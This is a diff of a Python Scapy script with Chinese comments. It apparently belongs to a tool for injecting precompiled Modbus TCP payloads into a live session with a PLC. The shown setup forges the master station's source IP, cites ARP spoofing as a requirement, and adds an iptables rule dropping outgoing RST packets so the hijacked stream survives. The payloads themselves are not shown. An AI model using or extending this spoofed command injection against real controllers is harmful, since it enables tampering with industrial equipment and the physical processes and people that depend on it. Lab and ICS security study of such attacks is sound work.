@@ -1,9 +1,9 @@
 #!/usr/bin/python
 
 ############################################
-# 使用 Scapy 發送 Modbus TCP Payloads
-# 若使用 非自身IP，需 ARP Spoofing
-# 需 sudo 權限 跟一些運氣
+# 使用 Scapy 在同一格 tcp.stream 發送預先編譯好的 Modbus TCP Payloads
+# 可以偽造來源，若使用 非自身 IP ，需 ARP Spoofing
+# 需 sudo 權限
 # Author: @dinlon5566 2024/06/27
 ############################################
 
@@ -11,8 +11,8 @@ from scapy.all import *
 from time import sleep
 import subprocess
 
-target_ip = "192.168.1.5"  # Target IP
-source_ip = "192.168.1.66"  # Source IP
+target_ip = "192.168.1.5"  # Target IP (PLC)
+source_ip = "192.168.1.66"  # Source IP 這邊可以偽造主站IP
 target_port = 502           # Modbus port
 
 # 避免被自動送 RST 中斷，程式中會用 iptables 擋掉
@@ -21,7 +21,7 @@ target_port = 502           # Modbus port
 
 def setup_iptables(source_ip):
     try:
-        # 用來添加iptables規則，阻止發送來自特定IP的RST包
+        # 用來添加iptables規則，阻止發送來自來源IP的RST包
         subprocess.run(['sudo', 'iptables', '-A', 'OUTPUT', '-p', 'tcp',
                        '--tcp-flags', 'RST', 'RST', '-s', source_ip, '-j', 'DROP'], check=True)
         print(f"iptables規則設置完成，已阻止從{source_ip}發送RST包")
